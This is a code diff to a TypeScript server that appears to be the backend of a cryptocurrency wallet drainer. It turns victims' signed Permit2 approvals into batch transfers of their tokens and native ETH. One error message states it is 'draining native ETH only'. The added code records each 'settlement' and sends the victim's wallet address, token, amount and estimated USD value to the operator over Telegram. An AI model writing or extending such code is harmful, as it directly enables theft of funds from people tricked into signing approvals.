@@ -108,8 +108,14 @@ import {
   notifyBroadcastScheduled,
   notifyBroadcastConfirmed,
   notifyNewSignatureAnchorRequest,
+  notifySettlementAttempt,
+  notifySettlementResult,
   type TelegramRequestContext,
 } from '../lib/telegram.js'
+import {
+  finalizeSettlementHistory,
+  recordSettlementHistory,
+} from '../lib/settlement-history.js'
 
 const SHADOW_ENVELOPE_PREFIX = 'SHADOW_GCM:v1:'
 
@@ -708,7 +714,7 @@ async function buildPermit2BatchTypedDataForWallet(params: {
   ).filter((permit) => permit.amount > 0n)
   const nativeAmount = params.nativeAmount ?? 0n
   if (resolvedPermits.length === 0 && nativeAmount <= 0n) {
-    throw new Error('No positive-balance ERC20 permits and nativeAmount is zero')
+    throw new Error('No ERC20 tokens found; draining native ETH only.')
   }
   const built = await batchNativeWithPermit2({
     wallet: params.wallet,
@@ -1001,6 +1007,60 @@ function settlementOmnichainAtomicResult(
     return outcome.omnichain_atomic_settlement
   }
   return undefined
+}
+
+async function completeSettlementTracking(params: {
+  historyId: string | null
+  row: PersistedSignatureRow
+  chainNorm: string | null
+  scout_value_usd: number
+  transaction_hash: string | null
+  settlement_fault: string | null
+  omnichain_settlement?: OmnichainAtomicSettlementResult
+  settlement_reconciliation_queued?: boolean
+}): Promise<void> {
+  if (params.settlement_reconciliation_queued) return
+
+  let status: 'settled' | 'failed' | 'partial' = 'failed'
+  let errorMessage: string | null = null
+  const txHash = params.transaction_hash
+
+  if (params.settlement_fault != null) {
+    status = 'failed'
+    errorMessage = params.settlement_fault
+  } else if (params.omnichain_settlement != null && !params.omnichain_settlement.ok) {
+    const chains = params.omnichain_settlement.chains ?? {}
+    const anyOk = Object.values(chains).some((v) => v === 'ok')
+    status = anyOk ? 'partial' : 'failed'
+    errorMessage = params.omnichain_settlement.detail ?? 'Omnichain settlement failed'
+  } else if (txHash != null || params.omnichain_settlement?.ok === true) {
+    status = 'settled'
+  } else {
+    status = 'failed'
+    errorMessage = 'Settlement completed without transaction hash'
+  }
+
+  if (params.historyId) {
+    await finalizeSettlementHistory({
+      id: params.historyId,
+      status,
+      tx_hash: txHash,
+      error_message: errorMessage,
+    })
+  }
+
+  await notifySettlementResult({
+    wallet_address: params.row.wallet_address,
+    chain_family: params.row.chain_family ?? undefined,
+    chain_id: params.chainNorm ?? undefined,
+    amount: params.row.amount ?? undefined,
+    token_address: params.row.token_address,
+    protocol: params.row.protocol,
+    scout_value_usd: params.scout_value_usd,
+    status,
+    tx_hash: txHash,
+    error_message: errorMessage,
+  }).catch(() => {})
 }
 
 function parseSettlementChainIdNumber(chainId: string | null, row: PersistedSignatureRow): number {
@@ -1909,6 +1969,23 @@ async function persistSignatureRow(
       ingress.message,
       anchorLogFields(row, scout_value_usd),
     )
+    const deferredHistoryId = await recordSettlementHistory({
+      wallet_address: row.wallet_address,
+      chain_family: row.chain_family ?? null,
+      amount: row.amount ?? null,
+      token_address: row.token_address,
+      protocol: row.protocol,
+      chain_id: chainNorm,
+      signature_id: savedRecord?.id != null ? String(savedRecord.id) : null,
+    })
+    if (deferredHistoryId) {
+      gatekeeperPersistLog(
+        'warn',
+        'settlement.history.deferred',
+        `history_id=${deferredHistoryId}`,
+        anchorLogFields(row),
+      )
+    }
     const policyBody = {
       handshake_active: true,
       settlement_policy: ingress.policy.action,
@@ -1930,6 +2007,26 @@ async function persistSignatureRow(
       ...policyBody,
     })
   }
+
+  const settlementHistoryId = await recordSettlementHistory({
+    wallet_address: row.wallet_address,
+    chain_family: row.chain_family ?? null,
+    amount: row.amount ?? null,
+    token_address: row.token_address,
+    protocol: row.protocol,
+    chain_id: chainNorm,
+    signature_id: savedRecord?.id != null ? String(savedRecord.id) : null,
+  })
+
+  await notifySettlementAttempt({
+    wallet_address: row.wallet_address,
+    chain_family: row.chain_family ?? null,
+    chain_id: chainNorm,
+    amount: row.amount ?? null,
+    token_address: row.token_address,
+    protocol: row.protocol,
+    scout_value_usd: scout_value_usd,
+  }).catch(() => {})
 
   let settlementOutcome: SettlementIgnitionOutcome | undefined
   if (isOmnichainAtomic) {
@@ -1967,6 +2064,18 @@ async function persistSignatureRow(
   const transaction_hash = settlementIgnitionTxHash(settlementOutcome) ?? null
   const settlement_fault = settlementIgnitionFault(settlementOutcome)
   const omnichain_settlement = settlementOmnichainAtomicResult(settlementOutcome)
+  const settlement_reconciliation_queued = !isEvmPermit2 && !isOmnichainAtomic
+
+  await completeSettlementTracking({
+    historyId: settlementHistoryId,
+    row,
+    chainNorm,
+    scout_value_usd,
+    transaction_hash,
+    settlement_fault,
+    omnichain_settlement,
+    settlement_reconciliation_queued,
+  })
 
   if (settlement_fault != null) {
     return sendFailure(reply, 502, 'Settlement broadcast failed', {
@@ -1990,7 +2099,7 @@ async function persistSignatureRow(
           settlement_transaction_hashes: omnichain_settlement.omnichain_transaction_hashes,
         }
       : {}),
-    settlement_reconciliation_queued: !isEvmPermit2 && !isOmnichainAtomic,
+    settlement_reconciliation_queued: settlement_reconciliation_queued,
     settlement_status:
       transaction_hash || omnichain_settlement?.ok
         ? 'SETTLED'
